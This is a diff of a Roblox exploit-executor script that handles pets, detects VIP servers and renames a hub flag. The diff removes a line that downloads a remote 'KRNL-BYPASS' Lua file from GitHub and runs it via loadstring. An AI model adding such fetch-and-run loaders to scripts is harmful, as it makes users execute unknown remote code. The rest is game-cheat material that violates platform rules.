@@ -44,7 +44,6 @@ end)
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
-        local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -57,9 +56,6 @@ end)
         wait(1)
     end
 end)()
-
-
-        loadstring(game:HttpGet(krnlbypass, true))()
         
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -102,11 +98,11 @@ end)()
             error("Script stopped - VIP Server detected")        
         end
 
-        if getgenv().EclipseHubRunning then
+        if getgenv().SMHubRunning then
             warn("Script is already running or has been executed! Cannot run again.")
             return
         end
-        getgenv().EclipseHubRunning = true
+        getgenv().SMHubRunning = true
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
